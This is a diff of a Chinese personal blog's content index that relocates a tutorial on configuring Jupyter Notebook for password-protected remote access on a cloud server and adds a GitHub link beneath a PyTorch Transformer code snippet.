-<h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><h4 id="1-生成配置文件"><a href="#1-生成配置文件" class="headerlink" title="1. 生成配置文件"></a>1. 生成配置文件</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></p>
-<h4 id="2-设置密码并生成密钥"><a href="#2-设置密码并生成密钥" class="headerlink" title="2. 设置密码并生成密钥"></a>2. 设置密码并生成密钥</h4><p><code>shell</code>下输入<code>python</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> notebook.auth <span class="hljs-keyword">import</span> passwd</span><br><span class="line">passwd()</span><br></pre></td></tr></table></figure><br>会出现让我们输入密码、确认密码<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">Enter password: </span><br><span class="line">Verify password: </span><br><span class="line"><span class="hljs-string">'sha1:*************’</span></span><br></pre></td></tr></table></figure><br>这个生成的密钥要记住，找个地方复制粘贴下来。</p>
-<h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
-<h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
-<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
     <title>SSH端口转发</title>
     <url>/2020/01/02/ssh-tips/</url>
     <content><![CDATA[<p>平时我们一般用ssh连接服务器，但它还可以用来端口转发呀！<a id="more"></a></p>
@@ -818,6 +803,21 @@
 <p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
 <p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
 <p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>服务器配置jupyter notebook实现远程访问</title>
+    <url>/2019/12/14/remote-jupyternotebook/</url>
+    <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
+<h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><p><code>jupyter notebook</code>会随着<code>Anaconda</code>一起安装好，因此我们只需要安装好<code>Anaconda</code>就好，详情请参照之前的博客。</p>
+<h3 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h3><h4 id="1-生成配置文件"><a href="#1-生成配置文件" class="headerlink" title="1. 生成配置文件"></a>1. 生成配置文件</h4><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-设置密码并生成密钥"><a href="#2-设置密码并生成密钥" class="headerlink" title="2. 设置密码并生成密钥"></a>2. 设置密码并生成密钥</h4><p><code>shell</code>下输入<code>python</code><br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> notebook.auth <span class="hljs-keyword">import</span> passwd</span><br><span class="line">passwd()</span><br></pre></td></tr></table></figure><br>会出现让我们输入密码、确认密码<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">Enter password: </span><br><span class="line">Verify password: </span><br><span class="line"><span class="hljs-string">'sha1:*************’</span></span><br></pre></td></tr></table></figure><br>这个生成的密钥要记住，找个地方复制粘贴下来。</p>
+<h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
+<h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -1531,6 +1531,7 @@ $$ NEXT = X_{embedding} + SelfAttention(Q, K, V) $$
 </p>
 
 <p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Transformer</span><span class="hljs-params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        super(Transformer, self).__init__()</span><br><span class="line">        self.encoder = Encoder().cuda()</span><br><span class="line">        self.decoder = Decoder().cuda()</span><br><span class="line">        self.projection = nn.Linear(d_model, tgt_vocab_size, bias=<span class="hljs-literal">False</span>).cuda()</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, enc_inputs, dec_inputs)</span>:</span></span><br><span class="line">        <span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">        enc_inputs: [batch_size, src_len]</span></span><br><span class="line"><span class="hljs-string">        dec_inputs: [batch_size, tgt_len]</span></span><br><span class="line"><span class="hljs-string">        '''</span></span><br><span class="line">        <span class="hljs-comment"># tensor to store decoder outputs</span></span><br><span class="line">        <span class="hljs-comment"># outputs = torch.zeros(batch_size, tgt_len, tgt_vocab_size).to(self.device)</span></span><br><span class="line">        </span><br><span class="line">        <span class="hljs-comment"># enc_outputs: [batch_size, src_len, d_model], enc_self_attns: [n_layers, batch_size, n_heads, src_len, src_len]</span></span><br><span class="line">        enc_outputs, enc_self_attns = self.encoder(enc_inputs)</span><br><span class="line">        <span class="hljs-comment"># dec_outpus: [batch_size, tgt_len, d_model], dec_self_attns: [n_layers, batch_size, n_heads, tgt_len, tgt_len], dec_enc_attn: [n_layers, batch_size, tgt_len, src_len]</span></span><br><span class="line">        dec_outputs, dec_self_attns, dec_enc_attns = self.decoder(dec_inputs, enc_inputs, enc_outputs)</span><br><span class="line">        dec_logits = self.projection(dec_outputs) <span class="hljs-comment"># dec_logits: [batch_size, tgt_len, tgt_vocab_size]</span></span><br><span class="line">        <span class="hljs-keyword">return</span> dec_logits.view(<span class="hljs-number">-1</span>, dec_logits.size(<span class="hljs-number">-1</span>)), enc_self_attns, dec_self_attns, dec_enc_attns</span><br></pre></td></tr></table></figure></p>
+<p>完整代码：<a href="https://github.com/aestheticisma/iWantOffer/blob/main/Transformer/Transformer.ipynb" target="_blank" rel="noopener">https://github.com/aestheticisma/iWantOffer/blob/main/Transformer/Transformer.ipynb</a></p>
 <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
 <li><a href="https://wmathor.com/index.php/archives/1438/" target="_blank" rel="noopener">https://wmathor.com/index.php/archives/1438/</a></li>
 <li><a href="https://www.cnblogs.com/zingp/p/11696111.html" target="_blank" rel="noopener">https://www.cnblogs.com/zingp/p/11696111.html</a></li>
